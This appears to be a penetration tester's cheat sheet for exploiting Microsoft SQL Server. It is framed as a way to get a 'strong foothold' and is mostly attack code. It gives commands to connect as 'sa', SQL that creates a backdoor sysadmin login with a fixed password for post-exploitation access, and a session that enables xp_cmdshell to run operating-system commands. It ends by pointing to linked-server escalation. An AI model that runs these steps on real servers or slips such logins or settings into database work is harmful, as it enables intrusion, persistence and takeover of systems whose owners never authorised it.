# MS-SQL Databases

MS-SQL or SQL Server is Microsoft's offering of an SQL Database.  The syntax and model is quite similar to standard SQL with the benefit of being able to hook directly into offerings such as Windows Active Directory and interface with the Windows operating system.  It is some of these features however that can allow us to get a strong foothold on a device.

## Connecting
There are multiple ways to interface with an MS-SQL server.

If on Linux then I'd recommend using sqsh

```bash
sqsh -S 192.168.0.6 -U sa
```

## User Creation

For creating a sysadmin user to enable easy access to the database post-exploitation, we'll need to create a login and associated user for SQL authentication.  We can then assign this user sysadmin privileges.

```sql
CREATE LOGIN booj WITH PASSWORD = 'B00j123!'
CREATE USER booj for LOGIN booj
EXEC sp_addsrvrolemember @loginame = N'booj', @rolename = N'sysadmin'
```

## xp\_cmdshell

```sql
1> exec sp_configure 'show advanced options', 1
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install. 
(return status = 0)
1> reconfigure
2> go
1> exec sp_configure 'xp_cmdshell', 1
2> go
Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
(return status = 0)
1> reconfigure
2> go
1> exec master..xp_cmdshell 'whoami' 
2> go
```

## Server Links

T
he best reference for exploiting server links is [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/) They're not hard to pull off and can allow you to escalate your permissions quite easily. However, do note that you should absolutely use rpc\_out if it's enabled.

Since OpenQuery can only satisfy user queries, stored procedures or user creation is not possible and makes your escalation path much more difficult.



